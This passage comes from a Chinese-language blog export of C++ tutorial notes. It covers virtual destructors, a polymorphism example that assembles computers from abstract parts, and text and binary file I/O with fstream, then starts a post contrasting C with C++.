<span class="keyword">delete</span> m_Name;</span><br><span class="line">			m_Name = <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	string *m_Name;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Animal *animal = <span class="keyword">new</span> <span class="built_in">Cat</span>(<span class="string">&quot;Tom&quot;</span>);</span><br><span class="line">	animal-&gt;<span class="built_in">Speak</span>();</span><br><span class="line"></span><br><span class="line">	<span class="comment">//通过父类指针去释放，会导致子类对象可能清理不干净，造成内存泄漏</span></span><br><span class="line">	<span class="comment">//怎么解决？给基类增加一个虚析构函数</span></span><br><span class="line">	<span class="comment">//虚析构函数就是用来解决通过父类指针释放子类对象</span></span><br><span class="line">	<span class="keyword">delete</span> animal;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>总结：</p>
<p>​	1. 虚析构或纯虚析构就是用来解决通过父类指针释放子类对象</p>
<p>​	2. 如果子类中没有堆区数据，可以不写为虚析构或纯虚析构</p>
<p>​	3. 拥有纯虚析构函数的类也属于抽象类</p>
<h4 id="4-7-6-多态案例三-电脑组装"><a href="#4-7-6-多态案例三-电脑组装" class="headerlink" title="4.7.6 多态案例三-电脑组装"></a>4.7.6 多态案例三-电脑组装</h4><p><strong>案例描述：</strong></p>
<p>电脑主要组成部件为 CPU（用于计算），显卡（用于显示），内存条（用于存储）</p>
<p>将每个零件封装出抽象基类，并且提供不同的厂商生产不同的零件，例如Intel厂商和Lenovo厂商</p>
<p>创建电脑类提供让电脑工作的函数，并且调用每个零件工作的接口</p>
<p>测试时组装三台不同的电脑进行工作</p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">//抽象CPU类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CPU</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="comment">//抽象的计算函数</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">calculate</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//抽象显卡类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">VideoCard</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="comment">//抽象的显示函数</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">display</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//抽象内存条类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Memory</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="comment">//抽象的存储函数</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">storage</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//电脑类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Computer</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Computer</span>(CPU * cpu, VideoCard * vc, Memory * mem)</span><br><span class="line">	&#123;</span><br><span class="line">		m_cpu = cpu;</span><br><span class="line">		m_vc = vc;</span><br><span class="line">		m_mem = mem;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//提供工作的函数</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">work</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="comment">//让零件工作起来，调用接口</span></span><br><span class="line">		m_cpu-&gt;<span class="built_in">calculate</span>();</span><br><span class="line"></span><br><span class="line">		m_vc-&gt;<span class="built_in">display</span>();</span><br><span class="line"></span><br><span class="line">		m_mem-&gt;<span class="built_in">storage</span>();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//提供析构函数 释放3个电脑零件</span></span><br><span class="line">	~<span class="built_in">Computer</span>()</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//释放CPU零件</span></span><br><span class="line">		<span class="keyword">if</span> (m_cpu != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">delete</span> m_cpu;</span><br><span class="line">			m_cpu = <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//释放显卡零件</span></span><br><span class="line">		<span class="keyword">if</span> (m_vc != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">delete</span> m_vc;</span><br><span class="line">			m_vc = <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//释放内存条零件</span></span><br><span class="line">		<span class="keyword">if</span> (m_mem != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">delete</span> m_mem;</span><br><span class="line">			m_mem = <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"></span><br><span class="line">	CPU * m_cpu; <span class="comment">//CPU的零件指针</span></span><br><span class="line">	VideoCard * m_vc; <span class="comment">//显卡零件指针</span></span><br><span class="line">	Memory * m_mem; <span class="comment">//内存条零件指针</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//具体厂商</span></span><br><span class="line"><span class="comment">//Intel厂商</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IntelCPU</span> :<span class="keyword">public</span> CPU</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">calculate</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Intel的CPU开始计算了！&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IntelVideoCard</span> :<span class="keyword">public</span> VideoCard</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">display</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Intel的显卡开始显示了！&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IntelMemory</span> :<span class="keyword">public</span> Memory</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">storage</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Intel的内存条开始存储了！&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Lenovo厂商</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LenovoCPU</span> :<span class="keyword">public</span> CPU</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">calculate</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Lenovo的CPU开始计算了！&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LenovoVideoCard</span> :<span class="keyword">public</span> VideoCard</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">display</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Lenovo的显卡开始显示了！&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LenovoMemory</span> :<span class="keyword">public</span> Memory</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">storage</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Lenovo的内存条开始存储了！&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//第一台电脑零件</span></span><br><span class="line">	CPU * intelCpu = <span class="keyword">new</span> IntelCPU;</span><br><span class="line">	VideoCard * intelCard = <span class="keyword">new</span> IntelVideoCard;</span><br><span class="line">	Memory * intelMem = <span class="keyword">new</span> IntelMemory;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;第一台电脑开始工作：&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="comment">//创建第一台电脑</span></span><br><span class="line">	Computer * computer1 = <span class="keyword">new</span> <span class="built_in">Computer</span>(intelCpu, intelCard, intelMem);</span><br><span class="line">	computer1-&gt;<span class="built_in">work</span>();</span><br><span class="line">	<span class="keyword">delete</span> computer1;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;-----------------------&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;第二台电脑开始工作：&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="comment">//第二台电脑组装</span></span><br><span class="line">	Computer * computer2 = <span class="keyword">new</span> <span class="built_in">Computer</span>(<span class="keyword">new</span> LenovoCPU, <span class="keyword">new</span> LenovoVideoCard, <span class="keyword">new</span> LenovoMemory);;</span><br><span class="line">	computer2-&gt;<span class="built_in">work</span>();</span><br><span class="line">	<span class="keyword">delete</span> computer2;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;-----------------------&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;第三台电脑开始工作：&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="comment">//第三台电脑组装</span></span><br><span class="line">	Computer * computer3 = <span class="keyword">new</span> <span class="built_in">Computer</span>(<span class="keyword">new</span> LenovoCPU, <span class="keyword">new</span> IntelVideoCard, <span class="keyword">new</span> LenovoMemory);;</span><br><span class="line">	computer3-&gt;<span class="built_in">work</span>();</span><br><span class="line">	<span class="keyword">delete</span> computer3;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>













<h2 id="5-文件操作"><a href="#5-文件操作" class="headerlink" title="5 文件操作"></a>5 文件操作</h2><p>程序运行时产生的数据都属于临时数据，程序一旦运行结束都会被释放</p>
<p>通过<strong>文件可以将数据持久化</strong></p>
<p>C++中对文件操作需要包含头文件 &#x3D;&#x3D;&lt; fstream &gt;&#x3D;&#x3D;</p>
<p>文件类型分为两种：</p>
<ol>
<li><strong>文本文件</strong>     -  文件以文本的<strong>ASCII码</strong>形式存储在计算机中</li>
<li><strong>二进制文件</strong> -  文件以文本的<strong>二进制</strong>形式存储在计算机中，用户一般不能直接读懂它们</li>
</ol>
<p>操作文件的三大类:</p>
<ol>
<li>ofstream：写操作</li>
<li>ifstream： 读操作</li>
<li>fstream ： 读写操作</li>
</ol>
<h3 id="5-1文本文件"><a href="#5-1文本文件" class="headerlink" title="5.1文本文件"></a>5.1文本文件</h3><h4 id="5-1-1写文件"><a href="#5-1-1写文件" class="headerlink" title="5.1.1写文件"></a>5.1.1写文件</h4><p>   写文件步骤如下：</p>
<ol>
<li><p>包含头文件   </p>
<p>  #include &lt;fstream&gt;</p>
</li>
<li><p>创建流对象  </p>
<p>ofstream ofs;</p>
</li>
<li><p>打开文件</p>
<p>ofs.open(“文件路径”,打开方式);</p>
</li>
<li><p>写数据</p>
<p>ofs &lt;&lt; “写入的数据”;</p>
</li>
<li><p>关闭文件</p>
<p>ofs.close();</p>
</li>
</ol>
<p>文件打开方式：</p>
<table>
<thead>
<tr>
<th>打开方式</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>ios::in</td>
<td>为读文件而打开文件</td>
</tr>
<tr>
<td>ios::out</td>
<td>为写文件而打开文件</td>
</tr>
<tr>
<td>ios::ate</td>
<td>初始位置：文件尾</td>
</tr>
<tr>
<td>ios::app</td>
<td>追加方式写文件</td>
</tr>
<tr>
<td>ios::trunc</td>
<td>如果文件存在先删除，再创建</td>
</tr>
<tr>
<td>ios::binary</td>
<td>二进制方式</td>
</tr>
</tbody></table>
<p><strong>注意：</strong> 文件打开方式可以配合使用，利用|操作符</p>
<p><strong>例如：</strong>用二进制方式写文件 <code>ios::binary |  ios:: out</code></p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ofstream ofs;</span><br><span class="line">	ofs.<span class="built_in">open</span>(<span class="string">&quot;test.txt&quot;</span>, ios::out);</span><br><span class="line"></span><br><span class="line">	ofs &lt;&lt; <span class="string">&quot;姓名：张三&quot;</span> &lt;&lt; endl;</span><br><span class="line">	ofs &lt;&lt; <span class="string">&quot;性别：男&quot;</span> &lt;&lt; endl;</span><br><span class="line">	ofs &lt;&lt; <span class="string">&quot;年龄：18&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	ofs.<span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：</p>
<ul>
<li>文件操作必须包含头文件 fstream</li>
<li>读文件可以利用 ofstream  ，或者fstream类</li>
<li>打开文件时候需要指定操作文件的路径，以及打开方式</li>
<li>利用&lt;&lt;可以向文件中写数据</li>
<li>操作完毕，要关闭文件</li>
</ul>
<h4 id="5-1-2读文件"><a href="#5-1-2读文件" class="headerlink" title="5.1.2读文件"></a>5.1.2读文件</h4><p>读文件与写文件步骤相似，但是读取方式相对于比较多</p>
<p>读文件步骤如下：</p>
<ol>
<li><p>包含头文件   </p>
<p>  #include &lt;fstream&gt;</p>
</li>
<li><p>创建流对象  </p>
<p>ifstream ifs;</p>
</li>
<li><p>打开文件并判断文件是否打开成功</p>
<p>ifs.open(“文件路径”,打开方式);</p>
</li>
<li><p>读数据</p>
<p>四种方式读取</p>
</li>
<li><p>关闭文件</p>
<p>ifs.close();</p>
</li>
</ol>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ifstream ifs;</span><br><span class="line">	ifs.<span class="built_in">open</span>(<span class="string">&quot;test.txt&quot;</span>, ios::in);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!ifs.<span class="built_in">is_open</span>())</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;文件打开失败&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//第一种方式</span></span><br><span class="line">	<span class="comment">//char buf[1024] = &#123; 0 &#125;;</span></span><br><span class="line">	<span class="comment">//while (ifs &gt;&gt; buf)</span></span><br><span class="line">	<span class="comment">//&#123;</span></span><br><span class="line">	<span class="comment">//	cout &lt;&lt; buf &lt;&lt; endl;</span></span><br><span class="line">	<span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//第二种</span></span><br><span class="line">	<span class="comment">//char buf[1024] = &#123; 0 &#125;;</span></span><br><span class="line">	<span class="comment">//while (ifs.getline(buf,sizeof(buf)))</span></span><br><span class="line">	<span class="comment">//&#123;</span></span><br><span class="line">	<span class="comment">//	cout &lt;&lt; buf &lt;&lt; endl;</span></span><br><span class="line">	<span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//第三种</span></span><br><span class="line">	<span class="comment">//string buf;</span></span><br><span class="line">	<span class="comment">//while (getline(ifs, buf))</span></span><br><span class="line">	<span class="comment">//&#123;</span></span><br><span class="line">	<span class="comment">//	cout &lt;&lt; buf &lt;&lt; endl;</span></span><br><span class="line">	<span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> c;</span><br><span class="line">	<span class="keyword">while</span> ((c = ifs.<span class="built_in">get</span>()) != EOF)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; c;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ifs.<span class="built_in">close</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：</p>
<ul>
<li>读文件可以利用 ifstream  ，或者fstream类</li>
<li>利用is_open函数可以判断文件是否打开成功</li>
<li>close 关闭文件</li>
</ul>
<h3 id="5-2-二进制文件"><a href="#5-2-二进制文件" class="headerlink" title="5.2 二进制文件"></a>5.2 二进制文件</h3><p>以二进制的方式对文件进行读写操作</p>
<p>打开方式要指定为 &#x3D;&#x3D;ios::binary&#x3D;&#x3D;</p>
<h4 id="5-2-1-写文件"><a href="#5-2-1-写文件" class="headerlink" title="5.2.1 写文件"></a>5.2.1 写文件</h4><p>二进制方式写文件主要利用流对象调用成员函数write</p>
<p>函数原型 ：<code>ostream&amp; write(const char * buffer,int len);</code></p>
<p>参数解释：字符指针buffer指向内存中一段存储空间。len是读写的字节数</p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">char</span> m_Name[<span class="number">64</span>];</span><br><span class="line">	<span class="type">int</span> m_Age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//二进制文件  写文件</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//1、包含头文件</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//2、创建输出流对象</span></span><br><span class="line">	<span class="function">ofstream <span class="title">ofs</span><span class="params">(<span class="string">&quot;person.txt&quot;</span>, ios::out | ios::binary)</span></span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//3、打开文件</span></span><br><span class="line">	<span class="comment">//ofs.open(&quot;person.txt&quot;, ios::out | ios::binary);</span></span><br><span class="line"></span><br><span class="line">	Person p = &#123;<span class="string">&quot;张三&quot;</span>  , <span class="number">18</span>&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//4、写文件</span></span><br><span class="line">	ofs.<span class="built_in">write</span>((<span class="type">const</span> <span class="type">char</span> *)&amp;p, <span class="built_in">sizeof</span>(p));</span><br><span class="line"></span><br><span class="line">	<span class="comment">//5、关闭文件</span></span><br><span class="line">	ofs.<span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：</p>
<ul>
<li>文件输出流对象 可以通过write函数，以二进制方式写数据</li>
</ul>
<h4 id="5-2-2-读文件"><a href="#5-2-2-读文件" class="headerlink" title="5.2.2 读文件"></a>5.2.2 读文件</h4><p>二进制方式读文件主要利用流对象调用成员函数read</p>
<p>函数原型：<code>istream&amp; read(char *buffer,int len);</code></p>
<p>参数解释：字符指针buffer指向内存中一段存储空间。len是读写的字节数</p>
<p>示例：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">char</span> m_Name[<span class="number">64</span>];</span><br><span class="line">	<span class="type">int</span> m_Age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">ifstream <span class="title">ifs</span><span class="params">(<span class="string">&quot;person.txt&quot;</span>, ios::in | ios::binary)</span></span>;</span><br><span class="line">	<span class="keyword">if</span> (!ifs.<span class="built_in">is_open</span>())</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;文件打开失败&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	Person p;</span><br><span class="line">	ifs.<span class="built_in">read</span>((<span class="type">char</span> *)&amp;p, <span class="built_in">sizeof</span>(p));</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;姓名： &quot;</span> &lt;&lt; p.m_Name &lt;&lt; <span class="string">&quot; 年龄： &quot;</span> &lt;&lt; p.m_Age &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<ul>
<li>文件输入流对象 可以通过read函数，以二进制方式读数据</li>
</ul>
<h1 id="资料分享"><a href="#资料分享" class="headerlink" title="资料分享"></a>资料分享</h1><p>源文件资料</p>
<p>匠心精作C++从0到1入门编程-学习编程不再难<br>链接：<a class="link"   href="https://pan.baidu.com/s/18N9kY4x6TN6q_S8FOlmEEQ?pwd=1234" >https://pan.baidu.com/s/18N9kY4x6TN6q_S8FOlmEEQ?pwd=1234 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>提取码：1234 </p>
<h1 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h1><p>此文章来自<a class="link"   href="https://www.bilibili.com/video/BV1et411b73Z/" >黑马程序员匠心之作|C++教程从0到1入门编程,学习编程不再难 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>未经许可禁止用于商业活动！！！</p>
]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>黑马程序员</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言与C++的不同点（基础部分）</title>
    <url>/2024/10/21/C++/%E5%9F%BA%E7%A1%80%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="C语言与C-的不同点（基础部分）"><a href="#C语言与C-的不同点（基础部分）" class="headerlink" title="C语言与C++的不同点（基础部分）"></a>C语言与C++的不同点（基础部分）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>适用于已经学过C语言的朋友想要快速入手C++的，这里归纳的一些基础的不同点，掌握后就可以手搓简单C++了，更难的部分请移步我的博客中的C++进阶部分</p>
<h2 id="1-头文件包含"><a href="#1-头文件包含" class="headerlink" title="1 头文件包含"></a>1 头文件包含</h2><p>C语言中一般这样开头</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br></pre></td></tr></table></figure></div>

<p>而C++里面是</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br></pre></td></tr></table></figure></div>


  <div class="note p-4 mb-4 rounded-small info">
    <p>初学只需要了解多写就可以，后续“成长”了，自己就会知道具体缘由了</p>

  </div>

<h2 id="2-输入输出"><a href="#2-输入输出" class="headerlink" title="2 输入输出"></a>2 输入输出</h2><p>C语言中输出与输入方式为</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a); <span class="comment">//输入</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,a); <span class="comment">//输出</span></span><br></pre></td></tr></table></figure></div>

<p>而C++是这样的</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a, b;</span><br><span class="line">cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line"><span class="type">char</span> str[<span class="number">20</span>];</span><br><span class="line">cin &gt;&gt; str;<span class="comment">//输入</span></span><br><span class="line"></span><br><span class="line">cout&lt;&lt;<span class="string">&quot;输入语句&quot;</span>&lt;&lt;a&lt;&lt;endl; <span class="comment">//输出</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//endl表示换行，可以用&quot;\n&quot;替代</span></span><br><span class="line">cout&lt;&lt;<span class="string">&quot;输入语句&quot;</span>&lt;&lt;a&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这里的’&gt;&gt;‘表示将前面的重定向输入到后面，&#x27;&lt;&lt;&#x27;表示，将后面的重定向输入到前面</span></span><br></pre></td></tr></table></figure></div>

<h2 id="3-数据类型"><a href="#3-数据类型" class="headerlink" title="3 数据类型"></a>3 数据类型</h2><p>C语言没有严格的bool类型，而C++有</p>
